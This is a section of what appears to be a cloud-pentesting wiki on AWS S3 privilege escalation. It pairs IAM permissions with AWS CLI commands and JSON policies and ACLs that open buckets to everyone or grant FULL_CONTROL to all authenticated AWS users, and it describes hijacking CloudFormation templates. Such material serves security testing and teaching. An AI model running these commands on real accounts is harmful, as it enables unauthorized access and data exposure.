## S3

### `s3:PutBucketNotification`, `s3:PutObject`, `s3:GetObject`

An attacker with those permissions over interesting buckets might be able to hijack resources and escalate privileges.

For example, an attacker with those **permissions over a cloudformation bucket** called "cf-templates-nohnwfax6a6i-us-east-1" will be able to hijack the deployment. The access can be given with the following policy:

```json
{
    "Version":"2012-10-17",
    "Statement":[
        {
            "Effect":"Allow",
            "Action":[
                "s3:PutBucketNotification",
                "s3:GetBucketNotification",
                "s3:PutObject",
                "s3:GetObject"],
            "Resource":[
                "arn:aws:s3:::cf-templates-*\/*",
                "arn:aws:s3:::cf-templates-*"]
        },
        {
            "Effect":"Allow",
            "Action":"s3:ListAllMyBuckets",
            "Resource":"*"
        }]
    }
```

And the hijack is possible because there is a **small time window from the moment the template is uploaded** to the bucket to the moment the **template is deployed**. An attacker might just create a **lambda function** in his account that will **trigger when a bucket notification is sent**, and **hijacks** the **content** of that **bucket**.

The Pacu module [`cfn__resouce_injection`](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#cfn\_\_resource\_injection) can be used to automate this attack.\
For mor informatino check the original research: [https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/](https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/)

### `s3:PutObject`, `s3:GetObject` <a href="#s3putobject-s3getobject" id="s3putobject-s3getobject"></a>

These are the permissions to **get and upload objects to S3**. Several services inside AWS (and outside of it) use S3 storage to store **config files**.\
An attacker with **read access** to them might find **sensitive information** on them.\
An attacker with **write access** to them could **modify the data to abuse some service and try to escalate privileges**.\
These are some examples:

* If an EC2 instance is storing the **user data in a S3 bucket**, an attacker could modify it to **execute arbitrary code inside the EC2 instance**.

### `s3:PutBucketPolicy`

An attacker, that needs to be **from the same account**, if not  the error `The specified method is not allowed will trigger`,  with this permission will be able to grant himself more permissions over the bucket(s) allowing him to read, write, modify, delete and expose buckets.

```bash
# Update Bucket policy
aws s3api put-bucket-policy --policy file:///root/policy.json --bucket <bucket-name>
##JSON policy example
{
  "Id": "Policy1568185116930",
  "Version": "2012-10-17",
  "Statement": [
  {
      "Sid": "Stmt1568184932403",
      "Action": [
        "s3:ListBucket"
      ],
      "Effect": "Allow",
      "Resource": "arn:aws:s3:::welcome",
      "Principal": "*"
  },
  {
    "Sid": "Stmt1568185007451",
    "Action": [
      "s3:GetObject"
    ],
    "Effect": "Allow",
    "Resource": "arn:aws:s3:::welcome/*",
    "Principal": "*"
  }
  ]
}
```

### `s3:GetBucketAcl`, `s3:PutBucketAcl`

An attacker could abuse these permissions to **grant him more access** over specific buckets.\
Note that the attacker doesn't need to be from the same account. Moreover the write access

```bash
# Update bucket ACL
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api put-bucket-acl --bucket <bucket-name> --access-control-policy file://acl.json

##JSON ACL example
## Make sure to modify the Owner‚Äôs displayName and ID according to the Object ACL you retrieved.
{
  "Owner": {
    "DisplayName": "<DisplayName>",
    "ID": "<ID>"
  },
  "Grants": [
  {
    "Grantee": {
      "Type": "Group",
      "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
    },
  "Permission": "FULL_CONTROL"
  }
  ]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```

### `s3:GetObjectAcl`, `s3:PutObjectAcl`

An attacker could abuse these permissions to grant him more access over specific objects inside buckets.

```bash
# Update bucket object ACL
aws s3api get-object-acl --bucket <bucket-name> --key flag 
aws s3api put-object-acl --bucket <bucket-name> --key flag --access-control-policy file://objacl.json

##JSON ACL example
## Make sure to modify the Owner‚Äôs displayName and ID according to the Object ACL you retrieved.
{
  "Owner": {
    "DisplayName": "<DisplayName>",
    "ID": "<ID>"
  },
  "Grants": [
  {
    "Grantee": {
      "Type": "Group",
      "URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
    },
  "Permission": "FULL_CONTROL"
  }
  ]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```

### `s3:GetObjectAcl`, `s3:PutObjectVersionAcl`

An attacker with these privileges is expected to be able to put an Acl to an specific object version

```bash
aws s3api get-object-acl --bucket <bucket-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --version-id <value> --access-control-policy file://objacl.json
```
